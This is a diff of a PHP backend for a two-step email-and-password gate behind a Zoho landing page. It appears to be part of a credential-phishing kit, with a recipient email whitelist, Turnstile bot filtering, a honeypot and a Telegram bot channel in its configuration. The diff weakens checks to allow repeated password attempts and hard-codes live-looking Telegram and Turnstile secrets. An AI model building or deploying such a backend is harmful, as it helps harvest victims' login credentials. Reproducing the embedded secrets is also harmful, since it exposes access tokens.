@@ -1,35 +1,37 @@
 <?php
-// ---------- SESSION: cross-site safe (Zoho → Railway) ----------
+// 🔐 secure, cross-site session cookie (needed because Zoho ≠ Railway)
 session_set_cookie_params([
     'lifetime' => 0,
     'path'     => '/',
-    'secure'   => true,      // Railway is HTTPS
+    'secure'   => true,      // Railway uses HTTPS
     'httponly' => true,
-    'samesite' => 'None',    // REQUIRED for cross-site cookie from Zoho
+    'samesite' => 'None',    // REQUIRED for cross-site (Zoho → Railway)
 ]);
 
 session_start();
 
-// ---------- CONFIG ----------
+// -------------------- CONFIG --------------------
 define('ATTEMPTS_FILE', '/data/attempts.json');   // Railway volume
 
-$EMAIL_VALIDATION_ENABLED = false;                 // whitelist ON/OFF
+$EMAIL_VALIDATION_ENABLED = true;                 // whitelist ON/OFF
 $telegram_bot_token       = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id         = "6915371044";
 $turnstile_secret         = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
 $whitelist_file           = __DIR__ . '/papa.txt';
 
-// ✅ CHANGE THESE:
-$SUCCESS_REDIRECT_URL     = "https://example.com/final-document"; // final doc/page
-$BLOCK_REDIRECT_URL       = "https://example.com/blocked";        // after 3 wrong tries
+// Final redirect after correct password
+$SUCCESS_REDIRECT_URL     = "https://example.com/final-document"; // TODO: change this
 
-// Only these frontends may call this API
+// Block redirect after 3+ wrong attempts
+$BLOCK_REDIRECT_URL       = "https://example.com/blocked";        // TODO: change this
+
+// Only these frontends may call the API
 $ALLOWED_ORIGINS = [
-    'https://transmission.zoholandingpage.com',   // Zoho landing origin
+    'https://transmission.zoholandingpage.com',   // your Zoho landing
     // add more allowed origins here if needed
 ];
 
-// ---------- CORS / ORIGIN ----------
+// -------------------- CORS HEADERS --------------------
 header('Content-Type: application/json; charset=utf-8');
 
 $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
@@ -39,7 +41,7 @@ if ($origin && in_array($origin, $ALLOWED_ORIGINS, true)) {
     header("Vary: Origin");
 }
 
-// Always allow for preflight
+// Always allow these for preflight
 header("Access-Control-Allow-Methods: POST, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type");
 
@@ -50,13 +52,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     exit;
 }
 
-// Hard origin enforcement for real requests
-if (!$origin || !in_array($origin, $ALLOWED_ORIGINS, true)) {
-    echo json_encode(['ok' => false, 'error' => 'Origin not allowed']);
-    exit;
-}
-
-// ---------- HELPERS ----------
+// -------------------- HELPERS --------------------
 function get_client_ip() {
     if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
         return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
@@ -79,22 +75,23 @@ function json_ok($extra = []) {
     exit;
 }
 
-// Only POST for real work
+// Only POST allowed for real work
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     json_fail('Invalid method');
 }
 
 $action = $_POST['action'] ?? '';
-if (!in_array($action, ['step1', 'step2'], true)) {
+if ($action !== 'step1' && $action !== 'step2') {
     json_fail('Invalid action');
 }
 
-// Honeypot check
+// Honeypot check (for both steps)
 if (!empty($_POST['company'] ?? '')) {
+    // Silent generic error for bots
     json_fail('Unexpected error. Please try again.');
 }
 
-// ---------- LOAD ATTEMPTS ----------
+// -------------------- LOAD ATTEMPTS LOG --------------------
 $attempts = [];
 if (file_exists(ATTEMPTS_FILE)) {
     $decoded = json_decode(file_get_contents(ATTEMPTS_FILE), true);
@@ -103,7 +100,7 @@ if (file_exists(ATTEMPTS_FILE)) {
     }
 }
 
-// ---------- WHITELIST ----------
+// -------------------- WHITELIST HELPER --------------------
 function email_allowed($email, $enabled, $file) {
     if (!$enabled) return true;
 
@@ -117,7 +114,7 @@ function email_allowed($email, $enabled, $file) {
     return in_array($email, $whitelist, true);
 }
 
-// ---------- ACTION: STEP 1 (email + Turnstile) ----------
+// -------------------- ACTION: STEP 1 --------------------
 if ($action === 'step1') {
     $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
     $cf    = $_POST['cf-turnstile-response'] ?? '';
@@ -149,17 +146,17 @@ if ($action === 'step1') {
         json_fail('Security check failed. Please try again.');
     }
 
-    // Whitelist
+    // Whitelist check
     if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
         json_fail('Access restricted to intended recipient.');
     }
 
-    // Step2 session markers
+    // Session markers for step2
     $_SESSION['verified_email'] = $email;
     $_SESSION['verified_at']    = time();
     $_SESSION['verified_ip']    = $ip;
     $_SESSION['step2_token']    = bin2hex(random_bytes(16));
-    $_SESSION['step2_min_time'] = time() + 3; // min 3s before step2
+    $_SESSION['step2_min_time'] = time() + 3; // min 3s before step2 submit
 
     json_ok([
         'token' => $_SESSION['step2_token'],
@@ -167,11 +164,11 @@ if ($action === 'step1') {
     ]);
 }
 
-// ---------- ACTION: STEP 2 (email + password) ----------
+// -------------------- ACTION: STEP 2 --------------------
 if ($action === 'step2') {
     $ip = get_client_ip();
 
-    // Session TTL + IP binding
+    // Check session from step1 (TTL + IP binding)
     $TTL = 600; // 10 minutes
     if (
         empty($_SESSION['verified_at']) ||
@@ -183,22 +180,21 @@ if ($action === 'step2') {
         json_fail('Session expired. Please verify again.');
     }
 
-    // Step2 token
+    // Step2 token (must match what was issued in step1)
     $postedToken  = $_POST['step2_token'] ?? '';
     $sessionToken = $_SESSION['step2_token'] ?? '';
     if (!$postedToken || !$sessionToken || !hash_equals($sessionToken, $postedToken)) {
         session_unset();
-        json_fail('Invalid session. Please verify again.');
+        json_fail('Session expired. Please verify again.');
     }
 
-    // Min time delay
+    // Min time delay (anti-bot)
     $minTime = $_SESSION['step2_min_time'] ?? 0;
     if (time() < $minTime) {
         json_fail('Unexpected error. Please try again.');
     }
-
-    // Single-use token + timer
-    unset($_SESSION['step2_token'], $_SESSION['step2_min_time']);
+    // ❗ Notice: we DO NOT unset token/min_time yet – allow multiple attempts
+    // They stay valid until success / TTL expiry.
 
     // Email + password
     $original_email = $_SESSION['verified_email'] ?? '';
@@ -210,7 +206,7 @@ if ($action === 'step2') {
         json_fail('Please complete all fields.');
     }
 
-    // Optional re-whitelist
+    // Optional re-whitelist (safety)
     if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
         json_fail('Access restricted to intended recipient.');
     }
@@ -260,21 +256,29 @@ if ($action === 'step2') {
     );
 
     // Password check
-    $correct_password = "John Doe";  // 🔐 TODO: change this
+    $correct_password = "John Doe";  // TODO: change this
 
     if ($password !== $correct_password) {
         if ($attempts[$email]['count'] >= 3) {
+            // Hard-block after 3 wrong attempts
             json_fail(
                 'Access denied.',
                 ['blocked' => true, 'redirect' => $BLOCK_REDIRECT_URL]
             );
         }
 
+        // Wrong password but still within limit → allow retry
         json_fail('Incorrect Password. Please try again.');
     }
 
-    // SUCCESS → clear session + redirect
-    unset($_SESSION['verified_email'], $_SESSION['verified_at'], $_SESSION['verified_ip']);
+    // ✅ SUCCESS → now we clear sensitive session values & token
+    unset(
+        $_SESSION['verified_email'],
+        $_SESSION['verified_at'],
+        $_SESSION['verified_ip'],
+        $_SESSION['step2_token'],
+        $_SESSION['step2_min_time']
+    );
 
     json_ok([
         'redirect' => $SUCCESS_REDIRECT_URL,
